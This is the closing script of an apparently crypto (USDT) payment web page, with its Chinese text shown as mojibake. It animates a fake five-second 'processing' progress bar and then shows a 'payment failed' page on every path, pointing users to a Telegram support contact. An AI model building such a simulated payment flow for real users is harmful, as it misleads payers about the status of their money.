                if (processingOverlay) processingOverlay.classList.add('active');
                
                try {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    closeConfirmModal();
                    
                    showPaymentProcessingPage(currentPaymentData);
                    
                    await processPaymentWithProgress();
                    
                    setTimeout(() => {
                        hidePaymentProcessingPage();
                        showPaymentFailedPage(currentPaymentData);
                    }, 5000);
                    
                } catch (error) {
                    setTimeout(() => {
                        hidePaymentProcessingPage();
                        showPaymentFailedPage(currentPaymentData);
                    }, 5000);
                } finally {
                    if (finalConfirmBtn) finalConfirmBtn.disabled = false;
                    if (processingOverlay) processingOverlay.classList.remove('active');
                }
            }
            
            function showPaymentProcessingPage(paymentData) {
                const processingPage = document.getElementById('processingPage');
                const messageElement = document.getElementById('processingPageMessage');
                
                if (processingPage) {
                    if (messageElement) {
                        messageElement.textContent = `æ­£åœ¨å¤„ç†æ‚¨çš„æ”¯ä»˜è¯·æ±‚ï¼š${paymentData.productType}ï¼Œé‡‘é¢ï¼š${paymentData.amount} USDTï¼Œè¯·è€å¿ƒç­‰å¾…...`;
                    }
                    
                    processingPage.classList.add('active');
                    document.body.style.overflow = 'hidden';
                    
                    // é‡ç½®è¿›åº¦æ¡çŠ¶æ€
                    document.getElementById('progressFill').style.width = '0%';
                    document.getElementById('countdownSeconds').textContent = '5';
                    
                    // é‡ç½®æ‰€æœ‰é˜¶æ®µçŠ¶æ€
                    for (let i = 1; i <= 4; i++) {
                        const stage = document.getElementById('stage' + i);
                        stage.classList.remove('active', 'completed');
                    }
                }
            }
            
            function hidePaymentProcessingPage() {
                const processingPage = document.getElementById('processingPage');
                if (processingPage) {
                    processingPage.classList.remove('active');
                    document.body.style.overflow = '';
                }
            }
            
            async function processPaymentWithProgress() {
                return new Promise((resolve) => {
                    const progressFill = document.getElementById('progressFill');
                    const countdownSeconds = document.getElementById('countdownSeconds');
                    
                    let progress = 0;
                    let seconds = 5;
                    const totalTime = 5000;
                    const interval = 100;
                    const steps = totalTime / interval;
                    const progressIncrement = 100 / steps;
                    
                    if (countdownSeconds) {
                        countdownSeconds.textContent = seconds;
                    }
                    
                    // é˜¶æ®µæ—¶é—´é…ç½®ï¼ˆæ¯«ç§’ï¼‰
                    const stageTimes = [
                        1000,  // é˜¶æ®µ1ï¼š0-1ç§’
                        2500,  // é˜¶æ®µ2ï¼š1-2.5ç§’
                        4000,  // é˜¶æ®µ3ï¼š2.5-4ç§’
                        5000   // é˜¶æ®µ4ï¼š4-5ç§’
                    ];
                    
                    let stageIndex = 0;
                    let elapsedTime = 0;
                    
                    const timer = setInterval(() => {
                        progress += progressIncrement;
                        elapsedTime += interval;
                        
                        if (progressFill) {
                            progressFill.style.width = progress + '%';
                        }
                        
                        // æ›´æ–°å€’è®¡æ—¶
                        const newSeconds = Math.ceil((totalTime - (progress / 100 * totalTime)) / 1000);
                        if (newSeconds !== seconds && countdownSeconds) {
                            seconds = newSeconds;
                            countdownSeconds.textContent = seconds;
                        }
                        
                        // æ›´æ–°é˜¶æ®µçŠ¶æ€
                        if (stageIndex < stageTimes.length && elapsedTime >= stageTimes[stageIndex]) {
                            for (let i = 1; i <= stageIndex; i++) {
                                const stage = document.getElementById('stage' + i);
                                if (stage) {
                                    stage.classList.remove('active');
                                    stage.classList.add('completed');
                                }
                            }
                            
                            const currentStage = document.getElementById('stage' + (stageIndex + 1));
                            if (currentStage) {
                                currentStage.classList.add('active');
                            }
                            
                            stageIndex++;
                        }
                        
                        if (progress >= 100) {
                            clearInterval(timer);
                            resolve();
                        }
                    }, interval);
                });
            }
            
            function showPaymentFailedPageImmediately(orderData) {
                const paymentContainer = document.querySelector('.payment-container');
                if (!paymentContainer) return;
                
                const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                       serviceType === 'trx' ? 'header-trx' : 'header-account';
                
                paymentContainer.innerHTML = `
                    <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                        <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                        <p>é‡‘é¢: ${orderData.amount} USDT</p>
                    </div>
                    
                    <div style="text-align: center; padding: 2rem 1.5rem;">
                        <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                        <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                        
                        <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                            <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                            <div>è®¢å•å·: ${orderData.orderId}</div>
                            <div>é‡‘é¢: <strong>${orderData.amount} USDT</strong></div>
                            <div>å•†å“ç±»å‹: ${orderData.productType}</div>
                            <div>æ•°é‡: ${orderData.quantity} ä¸ª</div>
                        </div>
                        
                        <div style="margin-top: 2rem;">
                            <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                                è¿”å›é¦–é¡µ
                            </button>
                            <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                                è”ç³»å®¢æœ
                            </button>
                        </div>
                    </div>
                `;
            }
            
            function showPaymentFailedPage(orderData) {
                const paymentContainer = document.querySelector('.payment-container');
                if (!paymentContainer) return;
                
                const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
                                       serviceType === 'trx' ? 'header-trx' : 'header-account';
                
                paymentContainer.innerHTML = `
                    <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
                        <h1>âŒ æ”¯ä»˜å¤±è´¥</h1>
                        <p>é‡‘é¢: ${orderData.amount} USDT</p>
                    </div>
                    
                    <div style="text-align: center; padding: 2rem 1.5rem;">
                        <div style="font-size: 4rem; margin-bottom: 1rem;">ğŸ’³</div>
                        <h2 style="color: #ff4d4f; margin-bottom: 1rem;">æ”¯ä»˜å¤±è´¥</h2>
                        
                        <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
                            <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">æ”¯ä»˜ä¿¡æ¯</div>
                            <div>è®¢å•å·: ${orderData.orderId}</div>
                            <div>é‡‘é¢: <strong>${orderData.amount} USDT</strong></div>
                            <div>å•†å“ç±»å‹: ${orderData.productType}</div>
                            <div>æ•°é‡: ${orderData.quantity} ä¸ª</div>
                        </div>
                        
                        <div style="margin-top: 2rem;">
                            <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
                                è¿”å›é¦–é¡µ
                            </button>
                            <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
                                è”ç³»å®¢æœ
                            </button>
                        </div>
                    </div>
                `;
            }
            
            function goBackToHome() {
                window.location.href = 'index.html';
            }
            
            function contactSupport() {
                window.open('https://t.me/yunfeng0571', '_blank');
            }
        </script>
    </body>
    </html>